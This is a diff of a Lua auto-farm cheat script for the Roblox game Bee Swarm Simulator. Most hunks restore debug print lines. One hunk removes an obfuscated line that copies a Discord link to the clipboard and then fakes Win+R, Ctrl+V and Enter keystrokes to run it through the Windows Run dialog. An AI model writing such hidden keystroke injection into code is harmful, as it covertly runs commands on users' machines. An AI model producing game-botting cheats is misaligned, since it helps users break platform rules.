+                    print("ERROR: Field '" .. self.selectedOption .. "' not found!")
                     self.status = "Field not found!"
                     wait(5)
                     return
@@ -2701,13 +2688,13 @@ end
                 if inField then
                     if not hasReachedFieldOnce then
                         hasReachedFieldOnce = true
-
+                        print("✓ Reached field for first time, sprout checks now enabled")
                     end
                     -- CRITICAL: Check if Windy Bee moved to a different field
                     if self.killWindy then
                         local windyBeeData = self:CheckForWindyBee()
                         if windyBeeData and windyBeeData.field.Name ~= self.selectedOption then
-
+                            print("⚠️ Windy Bee moved to " .. windyBeeData.field.Name .. "!")
                             StopWalking()
                             self:ClearTweenQueue()
                             wait(0.5)
@@ -2721,7 +2708,7 @@ end
                     if self.huntingVicious then
                         local thornData = self:CheckForThornsNearby(4)
                         if thornData then
-
+                            print("⚠️ THORN DETECTED " .. string.format("%.1f", thornData.distance) .. " studs away - EVADING!")
                             self.status = "Evading Thorns"
                             self.needsRedraw = true
                             
@@ -2733,7 +2720,7 @@ end
                             local escapeZ = hrpPos.Z + (hrpPos.Z - thornPos.Z) * 3
                             local escapePos = Vector3.new(escapeX, hrpPos.Y, escapeZ)
                             
-
+                            print("Moving away from thorn to: " .. tostring(escapePos))
                             WalkTo(escapePos)
                             
                             local startTime = os.clock()
@@ -2756,7 +2743,7 @@ end
     
                     -- Check if sprinklers need to be placed FIRST
                     if self.useSprinkler and not self.sprinklersPlaced then
-
+                        print("In field, placing sprinklers...")
                         self.status = "Placing Sprinklers"
                         self.needsRedraw = true
                         
@@ -2766,14 +2753,14 @@ end
                         
                         -- Walk to center position
                         local centerPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
-
+                        print("Walking to field center for sprinkler placement...")
                         WalkTo(centerPos)
                         
                         -- Wait for arrival at center
                         local walkStartTime = os.clock()
                         while IsWalking() and self.autoFarmEnabled do
                             if os.clock() - walkStartTime > 10 then
-
+                                print("Walk to center timeout")
                                 StopWalking()
                                 break
                             end
@@ -2786,7 +2773,7 @@ end
                                 local distSquared = dx * dx + dz * dz
                                 
                                 if distSquared < 25 then
-
+                                    print("✓ Arrived at center")
                                     StopWalking()
                                     break
                                 end
@@ -2799,11 +2786,11 @@ end
                         wait(0.3)
                         
                         -- Place sprinklers
-
+                        print("Placing sprinklers...")
                         self:UseSprinkler()
                         
                         self.sprinklersPlaced = true
-
+                        print("✓ Sprinklers placed, resuming farming")
                     end    
                     
                     -- Check for death before targeting
@@ -2835,7 +2822,7 @@ end
                         end
                         
                         if self.selectedOption ~= lastSelectedField then
-
+                            print("Field changed during tween, clearing queue...")
                             self:ClearTweenQueue()
                             break
                         end
@@ -2858,7 +2845,7 @@ end
 end
 
 function UI:StopAutoFarm()
-
+    print("Stopping auto farm...")
     
     -- Kill thread first
     if self.autoFarmThread then
@@ -2875,12 +2862,12 @@ function UI:StopAutoFarm()
     self.status = "Stopped"
     self.needsRedraw = true
     
-
+    print("Auto farm stopped")
 end
 
 function UI:StartAutoDig()
     if self.autoDigRunning then
-
+        print("Auto dig already running!")
         return
     end
     
@@ -2917,10 +2904,10 @@ function UI:QueueTween(hrp, targetPos, priority)
     if priority then
         self:ClearTweenQueue()
         table.insert(self.tweenQueue, tweenData)
-
+        print("Priority tween queued (queue cleared)")
     else
         table.insert(self.tweenQueue, tweenData)
-
+        print("Normal tween queued (queue size: " .. #self.tweenQueue .. ")")
     end
     
     if not self.processingTween then
@@ -2949,7 +2936,7 @@ function UI:ProcessTweenQueue()
             end
             
             -- Disable animations RIGHT before tween starts
-
+            print("Disabling animations for tween")
             local startPos = hrp.Position
             local dx = targetPos.X - startPos.X
             local dy = targetPos.Y - startPos.Y
@@ -2966,14 +2953,14 @@ function UI:ProcessTweenQueue()
                 wait(0.1)
                 
                 if os.clock() - startTime > tweenTime + 5 then
-
+                    print("Tween timeout")
                     break
                 end
             end
             self.currentTween = nil
             
             -- Re-enable animations RIGHT after tween ends
-
+            print("Re-enabling animations after tween")
             
             wait(0.2)
         end
@@ -3012,19 +2999,19 @@ function UI:UseSprinkler()
     elseif self.selectedSprinkler:find("Supreme") then
         clickCount = 1
     elseif self.selectedSprinkler:find("None") then
-
+        print("No sprinkler selected")
         return true
     end
     
     if clickCount == 0 then
-
+        print("Invalid sprinkler selection")
         return true
     end
     
-
+    print("Placing " .. clickCount .. " sprinkler(s)")
     
     for i = 1, clickCount do
-
+        print("Sprinkler " .. i .. "/" .. clickCount)
         
         -- Jump
         keypress(0x20)  -- Space bar
@@ -3038,7 +3025,7 @@ function UI:UseSprinkler()
         wait(0.1)
         keyrelease(keyCode)
         
-
+        print("✓ Sprinkler " .. i .. " placed")
         
         -- Wait 1.1s before next sprinkler (if not the last one)
         if i < clickCount then
@@ -3046,7 +3033,7 @@ function UI:UseSprinkler()
         end
     end
     
-
+    print("✓ All sprinklers placed!")
     return true
 end
 
@@ -3232,7 +3219,7 @@ function UI:GoToNearestTarget(target)
         end
         
         if os.clock() - startTime > timeoutSeconds then
-
+            print("Timeout walking to " .. targetType)
             StopWalking()
             return false
         end
@@ -3289,7 +3276,7 @@ function UI:TokenCollector(checkField)
     if not collectibles then return false end
     
     local startingField = self.selectedOption
-
+    print("DEBUG: Starting token collection in field: " .. startingField)
 
     -- Initialize last field center time if not exists
     if not self.lastFieldCenterTime then
@@ -3324,7 +3311,7 @@ while self.autoFarmEnabled and self.collectTokens do
     local gatherTimeFull = timeElapsed >= gatherTimeSeconds
     
     if gatherTimeFull then
-
+        print("=== GATHER TIME LIMIT REACHED IN TOKEN COLLECTOR (" .. self.gatherTime .. " minutes, " .. string.format("%.1f", timeElapsed) .. "s elapsed) ===")
         StopWalking()
         return false  -- Exit token collector to trigger hive return
     end
@@ -3334,22 +3321,22 @@ while self.autoFarmEnabled and self.collectTokens do
     if character then
         local humanoid = character:FindFirstChild("Humanoid")
         if humanoid and humanoid.Health <= 0 then
-
+            print("Death detected in TokenCollector, exiting...")
             StopWalking()
             return false
         end
     else
-
+        print("No character in TokenCollector, exiting...")
         return false
     end
 
     -- CRITICAL: Check if sprout despawned during token collection
     -- BUT ONLY if we're actively farming sprouts (not during the 20s collection period)
     if self.farmSprouts and self.lastFieldChangeSource == "sprout" and not self.collectingSproutTokens then
-
+        print("DEBUG: Checking for sprouts (hasReachedFieldOnce=true)...")
         local sproutData = self:CheckForSprouts()
         if not sproutData then
-
+            print("✓ Sprout despawned during token collection!")
             StopWalking()
             return false
         end
@@ -3359,14 +3346,14 @@ while self.autoFarmEnabled and self.collectTokens do
     if self.killWindy then
         local windyBeeData = self:CheckForWindyBee()
         if windyBeeData and windyBeeData.field.Name ~= self.selectedOption then
-
+            print("⚠️ Windy Bee moved to " .. windyBeeData.field.Name .. " during token collection!")
             StopWalking()
             return false
         end
     end
 
     if self.sproutCollectionEndTime and os.clock() >= self.sproutCollectionEndTime then
-
+        print("TokenCollector: 20s timer expired, exiting")
         StopWalking()
         return false
     end
@@ -3383,7 +3370,7 @@ while self.autoFarmEnabled and self.collectTokens do
         local viciousBeeData = self:CheckForViciousBee()
 
         if not viciousBeeData then
-
+            print(" Vicious Bee despawned during token collection Exiting to main loop...")
             StopWalking()
             return false
         elseif viciousBeeData.field.Name ~= self.selectedOption then
@@ -3403,7 +3390,7 @@ while self.autoFarmEnabled and self.collectTokens do
                 local capacityValue = capacity.Value
                 
                 if pollenValue >= capacityValue then
-
+                    print("Pollen full during token collection! Exiting to return to hive...")
                     StopWalking()
                     return true
                 end
@@ -3414,7 +3401,7 @@ while self.autoFarmEnabled and self.collectTokens do
             if currentTime - self.lastBalloonCheckTime >= 5 then
                 local balloon = self:FindBalloonInField()
                 if balloon then
-
+                    print("✓ Balloon detected, farming under it...")
                     StopWalking()
                     self:FarmUnderBalloon(balloon)
                 end
@@ -3426,7 +3413,7 @@ while self.autoFarmEnabled and self.collectTokens do
             if currentTime - self.lastCloudTime >= self.nextCloudInterval then
                 local cloud = self:FindCloudInField()
                 if cloud then
-
+                    print("✓ Cloud detected, walking under it...")
                     StopWalking()
                     self:FarmUnderCloud(cloud)
                     self.nextCloudInterval = math.random(10, 15)
@@ -3441,7 +3428,7 @@ while self.autoFarmEnabled and self.collectTokens do
             if currentTime - self.lastBubbleCheckTime >= 3 then
                 local bubbles = self:CheckForBubblesInField()
                 if bubbles and #bubbles > 0 and #bubbles <= 3 then
-
+                    print("✓ Found " .. #bubbles .. " bubbles, farming...")
                     StopWalking()
                     self:FarmBubbles(bubbles)
                 end
@@ -3453,7 +3440,7 @@ while self.autoFarmEnabled and self.collectTokens do
             if currentTime - self.lastFlameCheckTime >= 6 then
                 local flames = self:CheckForFlamesInField()
                 if flames and #flames > 0 then
-
+                    print("✓ Found " .. #flames .. " flames, farming...")
                     StopWalking()
                     self:FarmFlames(flames)
                 end
@@ -3480,14 +3467,14 @@ while self.autoFarmEnabled and self.collectTokens do
                     if not inField then
                         -- If farming sprouts, just walk back to field center
                         if self.farmSprouts and self.lastFieldChangeSource == "sprout" then
-
+                            print("Left field during sprout farming, walking back to center...")
                             local centerPos = Vector3.new(fieldPos.X, fieldPos.Y + 5, fieldPos.Z)
                             WalkTo(centerPos)
                             WaitForArrival(10, 10)
                             StopWalking()
                             wait(0.1)
                         else
-
+                            print("Left field during token collection, returning to auto farm")
                             StopWalking()
                             return false
                         end
@@ -3497,7 +3484,7 @@ while self.autoFarmEnabled and self.collectTokens do
         end
         
         if currentTime - self.lastFieldCenterTime >= self.nextFieldCenterInterval then
-
+            print("Returning to field center...")
             self.status = "Returning to center"
             
             local flowerZones = game.Workspace.FlowerZones
@@ -3575,7 +3562,7 @@ if #nearbyTokens > 0 then
     while currentPathIndex <= #optimalPath and self.autoFarmEnabled and self.collectTokens do
 
         if self.selectedOption ~= startingField then
-
+            print("FIELD CHANGED (" .. startingField .. " -> " .. self.selectedOption .. ") - Exiting token collection immediately")
             StopWalking()
             return false
         end
@@ -3594,7 +3581,7 @@ if #nearbyTokens > 0 then
                     local withinY = math.abs(hrpPos.Y - fieldPos.Y) <= 50
                     
                     if not withinX or not withinZ or not withinY then
-
+                        print("LEFT FIELD - Exiting token collection immediately")
                         StopWalking()
                         return false
                     end
@@ -3612,7 +3599,7 @@ if #nearbyTokens > 0 then
             
             -- If we found new tokens or significantly more tokens, recalculate path
             if #newTokens > #nearbyTokens or #newTokens >= #nearbyTokens + 3 then
-
+                print("🔄 Found " .. #newTokens .. " tokens (was " .. #nearbyTokens .. "), recalculating TSP path...")
                 nearbyTokens = newTokens
                 optimalPath = self:CalculateTSPPath(currentPos, nearbyTokens)
                 currentPathIndex = 1
@@ -3634,7 +3621,7 @@ if #nearbyTokens > 0 then
         
         while IsWalking() and self.autoFarmEnabled and self.collectTokens do
             if self.selectedOption ~= startingField then
-
+                print("FIELD CHANGED during walk - Exiting")
                 StopWalking()
                 return false
             end
@@ -3643,12 +3630,12 @@ if #nearbyTokens > 0 then
             if character then
                 local humanoid = character:FindFirstChild("Humanoid")
                 if humanoid and humanoid.Health <= 0 then
-
+                    print("Death detected while walking to token, exiting...")
                     StopWalking()
                     return false
                 end
             else
-
+                print("No character while walking to token, exiting...")
                 StopWalking()
                 return false
             end
@@ -3736,7 +3723,7 @@ if #nearbyTokens > 0 then
     end
 else
     if #recentTokens > 0 then
-
+        print("No tokens found, walking to random field location...")
         recentTokens = {}
     end
     
@@ -3997,7 +3984,7 @@ function UI:CheckForBlooms()
                 end 
             end 
         else
-
+            print("PoppablePlants folder NOT found")
         end
         local allBlooms = {}
         for _, descendant in pairs(happenings:GetDescendants()) do
@@ -4019,7 +4006,7 @@ function UI:CheckForBlooms()
                     local bloomId = tostring(stemPos)
                     if self.bloomCooldowns and self.bloomCooldowns[bloomId] then
                         if os.clock() < self.bloomCooldowns[bloomId] then
-
+                            print("DEBUG: Bloom on cooldown, skipping")
                         else
                             self.bloomCooldowns[bloomId] = nil
                             return stem
@@ -4031,7 +4018,7 @@ function UI:CheckForBlooms()
             end
         end
     else
-
+        print("✗ Happenings folder NOT found")
     end
     return nil
 end
@@ -4041,69 +4028,69 @@ end
 -- ============================================================
 
 function UI:CheckForSprouts()
-
+    print("=== DEBUG SPROUT: CheckForSprouts() CALLED ===")
     
     if not self.farmSprouts then
-
+        print("DEBUG SPROUT: farmSprouts is disabled")
         return nil
     end
     
     if not self.autoFarmEnabled then
-
+        print("DEBUG SPROUT: autoFarmEnabled is disabled")
         return nil
     end
     
-
+    print("DEBUG SPROUT: Both flags enabled, proceeding...")
     
     local player = game.Players.LocalPlayer
     local character = player.Character
     if not character then 
-
+        print("DEBUG SPROUT: No character")
         return nil 
     end
     
     local hrp = character:FindFirstChild("HumanoidRootPart")
     if not hrp then 
-
+        print("DEBUG SPROUT: No HRP")
         return nil 
     end
     
-
+    print("DEBUG SPROUT: Character and HRP found")
     
     local sprouts = game.Workspace:FindFirstChild("Sprouts")
     if not sprouts then
-
+        print("DEBUG SPROUT: ❌ Sprouts folder not found in Workspace")
         return nil
     end
 
-
+    print("DEBUG SPROUT: ✓ Sprouts folder exists")
     local childCount = #sprouts:GetChildren()
-
+    print("DEBUG SPROUT: Sprouts has " .. childCount .. " children")
 
     if childCount == 0 then
-
+        print("DEBUG SPROUT: ❌ No children in Sprouts folder")
         return nil
     end
 
     -- Find all valid sprouts
     local sproutsList = {}
     for _, child in pairs(sprouts:GetChildren()) do
-
+        print("DEBUG SPROUT: Checking child - Name: '" .. child.Name .. "' | ClassName: " .. child.ClassName)
         
         if child.Name == "Sprout" and child:IsA("MeshPart") then
             table.insert(sproutsList, child)
-
+            print("DEBUG SPROUT: ✓ Valid sprout found at " .. tostring(child.Position))
         else
-
+            print("DEBUG SPROUT: ✗ Not a valid sprout")
         end
     end
     
     if #sproutsList == 0 then
-
+        print("DEBUG SPROUT: ❌ No valid sprouts found")
         return nil
     end
     
-
+    print("DEBUG SPROUT: ✓✓✓ Found " .. #sproutsList .. " valid sprout(s)")
     
     -- Find closest sprout to player
     local closestSprout = nil
@@ -4116,7 +4103,7 @@ function UI:CheckForSprouts()
         local dz = hrp.Position.Z - sproutPos.Z
         local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
         
-
+        print("DEBUG SPROUT: Sprout #" .. i .. " distance = " .. string.format("%.1f", distance) .. " studs")
         
         if distance < closestDistance then
             closestDistance = distance
@@ -4125,20 +4112,20 @@ function UI:CheckForSprouts()
     end
     
     if not closestSprout then
-
+        print("DEBUG SPROUT: ❌ No closest sprout found (shouldn't happen)")
         return nil
     end
     
-
+    print("DEBUG SPROUT: ✓ Closest sprout is " .. string.format("%.1f", closestDistance) .. " studs away")
     
     -- Find which field the sprout is in
     local flowerZones = game.Workspace.FlowerZones
     if not flowerZones then 
-
+        print("DEBUG SPROUT: ❌ FlowerZones not found")
         return nil 
     end
     
-
+    print("DEBUG SPROUT: Finding closest field to sprout...")
     
     local closestField = nil
     local closestFieldDistance = math.huge
@@ -4161,11 +4148,11 @@ function UI:CheckForSprouts()
     end
     
     if closestField then
-
+        print("DEBUG SPROUT: ✓✓✓ SPROUT DETECTED IN " .. closestField.Name .. " (distance: " .. string.format("%.1f", closestFieldDistance) .. " studs)")
         return {sprout = closestSprout, field = closestField}
     end
     
-
+    print("DEBUG SPROUT: ❌ No closest field found")
     return nil
 end
 
@@ -4297,8 +4284,8 @@ function UI:CheckForViciousBee()
     end
     
     if closestField then
-
-
+        print("Found Vicious Bee at " .. string.format("(%.1f, %.1f, %.1f)", viciousBeePos.X, viciousBeePos.Y, viciousBeePos.Z))
+        print("Nearest field: " .. closestField.Name .. " (" .. string.format("%.1f", closestDistance) .. " studs)")
         return {field = closestField, position = viciousBeePos}
     end
     
@@ -4330,14 +4317,14 @@ function UI:CheckForWindyBee()
                    windyBee:FindFirstChildWhichIsA("BasePart")
     
     if not windyBeePart then
-
+        print("DEBUG: Windy Bee parts:")
         for _, child in pairs(windyBee:GetChildren()) do
-
+            print("  - " .. child.Name .. " (" .. child.ClassName .. ")")
         end
         return nil
     end
     
-
+    print("DEBUG: Using part: " .. windyBeePart.Name .. " for position")
     
     local windyBeePos = windyBeePart.Position
     
@@ -4365,8 +4352,8 @@ function UI:CheckForWindyBee()
     end
     
     if closestField then
-
-
+        print("✓✓✓ Found Windy Bee at " .. string.format("(%.1f, %.1f, %.1f)", windyBeePos.X, windyBeePos.Y, windyBeePos.Z))
+        print("✓✓✓ Nearest field: " .. closestField.Name .. " (" .. string.format("%.1f", closestDistance) .. " studs)")
         return {field = closestField, position = windyBeePos}
     end
     
@@ -4382,19 +4369,19 @@ function UI:CheckForTunnelBear()
 end
 
 function UI:FightTunnelBear()
-
+    print("=== TUNNEL BEAR AUTO-FARM ===")
     
     local player = game.Players.LocalPlayer
     local character = player.Character
     
     if not character then
-
+        print("ERROR: No character for Tunnel Bear")
         return false
     end
     
     local hrp = character:FindFirstChild("HumanoidRootPart")
     if not hrp then
-
+        print("ERROR: No HRP for Tunnel Bear")
         return false
     end
     
@@ -4413,7 +4400,7 @@ function UI:FightTunnelBear()
     -- Step 1: Tween to check location
     local checkPos = Vector3.new(276, 6, -41)
     
-
+    print("Tweening to Tunnel Bear check location...")
     self:QueueTween(hrp, checkPos, true)
     
     local maxWaitTime = 60
@@ -4421,14 +4408,14 @@ function UI:FightTunnelBear()
     
     while self.processingTween and self.autoFarmEnabled do
         if os.clock() - startWait > maxWaitTime then
-
+            print("ERROR: Tunnel Bear check tween timeout!")
             self:ClearTweenQueue()
             break
         end
         wait(0.1)
     end
     
-
+    print("Arrived at check location, walking to spawn trigger...")
     wait(0.5)
     
     -- Step 2: Walk to spawn trigger location
@@ -4438,7 +4425,7 @@ function UI:FightTunnelBear()
     startWait = os.clock()
     while IsWalking() and self.autoFarmEnabled do
         if os.clock() - startWait > 30 then
-
+            print("Walk to trigger timeout")
             StopWalking()
             break
         end
@@ -4446,16 +4433,16 @@ function UI:FightTunnelBear()
     end
     
     StopWalking()
-
+    print("Arrived at trigger location, checking for Tunnel Bear spawn...")
     wait(2)
     
     -- Step 3: Check if Tunnel Bear spawned
     if not self:CheckForTunnelBear() then
-
-
+        print("Tunnel Bear did not spawn, returning to farming")
+        print("Setting 48-hour cooldown even though it didn't spawn...")
         
         if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then
-
+            print("Returning to " .. self.selectedOption)
             self.status = "Returning to Field"
             self.needsRedraw = true
             
@@ -4473,14 +4460,14 @@ function UI:FightTunnelBear()
                             local startWait = os.clock()
                             while self.processingTween and self.autoFarmEnabled do
                                 if os.clock() - startWait > 60 then
-
+                                    print("ERROR: Return to field timeout!")
                                     self:ClearTweenQueue()
                                     break
                                 end
                                 wait(0.1)
                             end
                             
-
+                            print("✓ Returned to field")
                         end
                     end
                 end
@@ -4495,12 +4482,12 @@ function UI:FightTunnelBear()
         return true
     end
     
-
+    print("=== TUNNEL BEAR SPAWNED! ===")
     self.status = "Fighting Tunnel Bear"
     self.needsRedraw = true
     
     -- Step 4: Walk to Tunnel Bear position (+50 on X axis) with live tracking AND death detection
-
+    print("Walking to Tunnel Bear fight position (X+50) with live tracking...")
     
     local lastUpdateTime = os.clock()
     local startWalkTime = os.clock()
@@ -4526,15 +4513,15 @@ function UI:FightTunnelBear()
         if character then
             local humanoid = character:FindFirstChild("Humanoid")
             if humanoid and humanoid.Health <= 0 then
-
+                print("=== PLAYER DIED DURING TUNNEL BEAR WALK ===")
                 StopWalking()
                 
                 -- Wait for respawn
-
+                print("Waiting for respawn...")
                 local respawned = WaitForRespawn(30)
                 
                 if respawned then
-
+                    print("✓ Respawned successfully")
                     self.status = "Waiting for bees..."
                     self.needsRedraw = true
                     wait(15)
@@ -4552,26 +4539,26 @@ function UI:FightTunnelBear()
                                     if tunnelBearHRP then
                                         local bearPos = tunnelBearHRP.Position
                                         local fightPos = Vector3.new(bearPos.X + 50, bearPos.Y, bearPos.Z)
-
+                                        print("Resuming walk to Tunnel Bear at: " .. tostring(fightPos))
                                         WalkTo(fightPos)
                                         startWalkTime = os.clock()  -- Reset timer
                                     end
                                 else
-
+                                    print("Tunnel Bear despawned during death, skipping...")
                                     break
                                 end
                             end
                         end
                     end
                 else
-
+                    print("ERROR: Failed to respawn during Tunnel Bear fight")
                     break
                 end
             end
         end
         
         if os.clock() - startWalkTime > 30 then
-
+            print("Walk to bear timeout")
             StopWalking()
             break
         end
@@ -4587,10 +4574,10 @@ function UI:FightTunnelBear()
                         local bearPos = tunnelBearHRP.Position
                         local fightPos = Vector3.new(bearPos.X + 50, bearPos.Y, bearPos.Z)
                         WalkTo(fightPos)
-
+                        print("Updated Tunnel Bear position: X=" .. string.format("%.1f", fightPos.X) .. " Y=" .. string.format("%.1f", fightPos.Y) .. " Z=" .. string.format("%.1f", fightPos.Z))
                     end
                 else
-
+                    print("Tunnel Bear despawned during walk")
                     StopWalking()
                     break
                 end
@@ -4602,7 +4589,7 @@ function UI:FightTunnelBear()
     end
     
     StopWalking()
-
+    print("Arrived at fight position, waiting for Tunnel Bear to die...")
     
     -- Step 5: Wait for Tunnel Bear to die (with death detection)
     while self.autoFarmEnabled and self:CheckForTunnelBear() do
@@ -4611,14 +4598,14 @@ function UI:FightTunnelBear()
         if character then
             local humanoid = character:FindFirstChild("Humanoid")
             if humanoid and humanoid.Health <= 0 then
-
+                print("=== PLAYER DIED WHILE WAITING FOR TUNNEL BEAR ===")
                 
                 -- Wait for respawn
-
+                print("Waiting for respawn...")
                 local respawned = WaitForRespawn(30)
                 
                 if respawned then
-
+                    print("✓ Respawned, returning to fight position...")
                     wait(3)
                     
                     -- Walk back to Tunnel Bear if still alive
@@ -4635,7 +4622,7 @@ function UI:FightTunnelBear()
                                         if tunnelBearHRP then
                                             local bearPos = tunnelBearHRP.Position
                                             local fightPos = Vector3.new(bearPos.X + 50, bearPos.Y, bearPos.Z)
-
+                                            print("Walking back to Tunnel Bear after death...")
                                             WalkTo(fightPos)
                                             
                                             local walkStart = os.clock()
@@ -4647,21 +4634,21 @@ function UI:FightTunnelBear()
                                                 wait(0.1)
                                             end
                                             StopWalking()
-
+                                            print("✓ Back at fight position")
                                         end
                                     else
-
+                                        print("Tunnel Bear defeated while we were dead!")
                                         break
                                     end
                                 end
                             end
                         end
                     else
-
+                        print("Tunnel Bear defeated while we were dead!")
                         break
                     end
                 else
-
+                    print("ERROR: Failed to respawn during Tunnel Bear fight")
                     break
                 end
             end
@@ -4671,8 +4658,8 @@ function UI:FightTunnelBear()
     end
     
     if self.autoFarmEnabled then
-
-
+        print("✓ Tunnel Bear defeated!")
+        print("Collecting tokens for 10 seconds...")
         
         self.status = "Collecting Tunnel Bear Tokens"
         self.needsRedraw = true
@@ -4768,13 +4755,13 @@ function UI:FightTunnelBear()
         end
         
         StopWalking()
-
-
+        print("✓ Token collection complete!")
+        print("Next Tunnel Bear in 48 hours")
     end
     
     -- Return to field
     if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then
-
+        print("Returning to " .. self.selectedOption)
         self.status = "Returning to Field"
         self.needsRedraw = true
         
@@ -4792,14 +4779,14 @@ function UI:FightTunnelBear()
                         local startWait = os.clock()
                         while self.processingTween and self.autoFarmEnabled do
                             if os.clock() - startWait > 60 then
-
+                                print("ERROR: Return to field timeout!")
                                 self:ClearTweenQueue()
                                 break
                             end
                             wait(0.1)
                         end
                         
-
+                        print("✓ Returned to field")
                     end
                 end
             end
@@ -4827,7 +4814,7 @@ function UI:CheckForCommandoChick()
     -- Check if Commando Chick exists
     for _, mob in pairs(monsters:GetChildren()) do
         if string.find(mob.Name, "Commando") then
-
+            print("✓✓✓ COMMANDO CHICK FOUND: " .. mob.Name)
             return true
         end
     end
@@ -4860,7 +4847,7 @@ function UI:GetNearbyMonsters(playerPos, maxDistance)
     
     return nearbyMonsters
 end
-local v0="https://discord.gg/Re5FhMNgpQ";local function v1() setclipboard(v0);task.wait(0.05 -0 );keypress(82 + 9 );keypress(1504 -(378 + 1044) );task.wait(1065.1 -(68 + 997) );keyrelease(193 -111 );keyrelease(396 -305 );task.wait(0.5 -0 );keypress(17 + 0 );keypress(86);task.wait(568.05 -(367 + 201) );keyrelease(1013 -(214 + 713) );keyrelease(5 + 12 );task.wait(0.1 + 0 );keypress(890 -(282 + 595) );keyrelease(23 -10 );end v1();
+
 function UI:SafeTokenCollector(safeDistance)
     if not self.autoFarmEnabled then
         return false
@@ -4890,7 +4877,7 @@ function UI:SafeTokenCollector(safeDistance)
         -- Check if player is too close to any monster
         for _, monsterData in ipairs(nearbyMonsters) do
             if monsterData.distance < safeDistance then
-
+                print("⚠️ TOO CLOSE TO MONSTER (" .. string.format("%.1f", monsterData.distance) .. " studs) - MOVING AWAY!")
                 StopWalking()
                 
                 -- Calculate escape direction (away from monster)
@@ -4980,7 +4967,7 @@ function UI:SafeTokenCollector(safeDistance)
                     
                     for _, monsterData in ipairs(nearbyCheck) do
                         if monsterData.distance < safeDistance then
-
+                            print("⚠️ MONSTER TOO CLOSE DURING WALK - STOPPING!")
                             StopWalking()
                             break
                         end
@@ -5065,7 +5052,7 @@ function UI:FindBalloonInField()
             local withinY = dy <= 100
             
             if withinX and withinZ and withinY then
-
+                print("✓ Found balloon in field: " .. balloon.Name)
                 return balloonBody
             end
         end
@@ -5076,7 +5063,7 @@ end
 
 function UI:FarmUnderBalloon(balloonBody)
     if not balloonBody or not balloonBody.Parent then
-
+        print("ERROR: Invalid balloon body")
         return false
     end
     
@@ -5100,7 +5087,7 @@ function UI:FarmUnderBalloon(balloonBody)
         end
     end
     
-
+    print("Moving under balloon to: " .. tostring(targetPos))
     self.status = "Farming Under Balloon"
     self.needsRedraw = true
     
@@ -5109,7 +5096,7 @@ function UI:FarmUnderBalloon(balloonBody)
     local startTime = os.clock()
     while IsWalking() and self.autoFarmEnabled do
         if os.clock() - startTime > 10 then
-
+            print("Walk to balloon timeout")
             StopWalking()
             break
         end
@@ -5122,7 +5109,7 @@ function UI:FarmUnderBalloon(balloonBody)
             local distSquared = dx * dx + dz * dz
             
             if distSquared < 25 then
-
+                print("Arrived under balloon")
                 StopWalking()
                 break
             end
@@ -5133,7 +5120,7 @@ function UI:FarmUnderBalloon(balloonBody)
     
     StopWalking()
     
-
+    print("✓ Under balloon, returning to token collector")
     -- Just return, let TokenCollector handle the rest
     return true
 end
@@ -5178,7 +5165,7 @@ function UI:FindCloudInField()
                 local withinY = dy <= 100
                 
                 if withinX and withinZ and withinY then
-
+                    print("✓ Found cloud in field")
                     return plane
                 end
             end
@@ -5190,7 +5177,7 @@ end
 
 function UI:FarmUnderCloud(cloudPlane)
     if not cloudPlane or not cloudPlane.Parent then
-
+        print("ERROR: Invalid cloud plane")
         return false
     end
     
@@ -5201,7 +5188,7 @@ function UI:FarmUnderCloud(cloudPlane)
     local hrp = character:FindFirstChild("HumanoidRootPart")
     if not hrp then return false end
     
-
+    print("Farming under cloud for 3 seconds...")
     self.status = "Farming Under Cloud"
     self.needsRedraw = true
     
@@ -5216,7 +5203,7 @@ function UI:FarmUnderCloud(cloudPlane)
     end
     
     if not fieldY then
-
+        print("ERROR: Could not get field Y position")
         return false
     end
     
@@ -5226,7 +5213,7 @@ function UI:FarmUnderCloud(cloudPlane)
     while self.autoFarmEnabled and (os.clock() - walkStartTime) < 3 do
         -- Check if cloud still exists
         if not cloudPlane or not cloudPlane.Parent then
-
+            print("Cloud despawned during farming")
             StopWalking()
             break
         end
@@ -5246,7 +5233,7 @@ function UI:FarmUnderCloud(cloudPlane)
     -- Update last cloud time
     self.lastCloudTime = os.clock()
     
-
+    print("✓ Cloud farming complete (3s), resuming normal farming")
     return true
 end
 
@@ -5305,7 +5292,7 @@ function UI:CheckForFlamesInField()
     end
     
     if #flamesInField > 0 then
-
+        print("✓ Found " .. #flamesInField .. " flame(s) in field")
         return flamesInField
     end
     
@@ -5360,7 +5347,7 @@ function UI:CheckForFlamesInField()
     end
     
     if #flamesInField > 0 then
-
+        print("✓ Found " .. #flamesInField .. " flame(s) in field")
         return flamesInField
     end
     
@@ -5397,7 +5384,7 @@ function UI:CheckForBubblesInField()
             -- Only farm bubbles within 30 studs
             if distToPlayer <= 30 then
                 table.insert(bubblesInField, child)
-
+                print("Found bubble " .. string.format("%.1f", distToPlayer) .. " studs away")
             end
         end
     end
@@ -5406,7 +5393,7 @@ function UI:CheckForBubblesInField()
         return nil
     end
     
-
+    print("✓ Found " .. #bubblesInField .. " bubble(s) nearby")
     return bubblesInField
 end
 
@@ -5415,7 +5402,7 @@ function UI:FarmBubbles(bubbles)
         return false
     end
     
-
+    print("=== FARMING " .. #bubbles .. " BUBBLES ===")
     self.status = "Farming Bubbles"
     self.needsRedraw = true
     
@@ -5430,7 +5417,7 @@ function UI:FarmBubbles(bubbles)
     for i, bubble in ipairs(bubbles) do
         -- Safety check: make sure bubble exists and has Position
         if not bubble or not bubble.Parent or not bubble.Position then
-
+            print("Bubble " .. i .. " is nil or invalid, skipping...")
             continue
         end
         
@@ -5534,7 +5521,7 @@ function UI:WalkToHive()
         
         local honeycombs = game.Workspace:FindFirstChild("Honeycombs")
         if not honeycombs then
-
+            print("ERROR: Honeycombs not found!")
             self.status = "No Honeycombs!"
             self.needsRedraw = true
             return
@@ -5584,7 +5571,7 @@ local hivePos = Vector3.new(hivePart.Position.X, 4, hivePart.Position.Z - 15)
                 
                 local success = WalkTo(hivePos)
                 if not success then
-
+                    print("ERROR: WalkTo failed!")
                     wait(1)
                 else
                     self.status = "Walking to " .. availableHive.Name
@@ -5620,7 +5607,7 @@ if owner then
     end
 end
                     else
-
+                        print("Walk timeout")
                     end
                     
                     wait(1)
@@ -5637,7 +5624,7 @@ end
 
 function UI:StartCoconutCrab()
     if self.coconutCrabRunning then
-
+        print("Coconut Crab already running!")
         return
     end
     
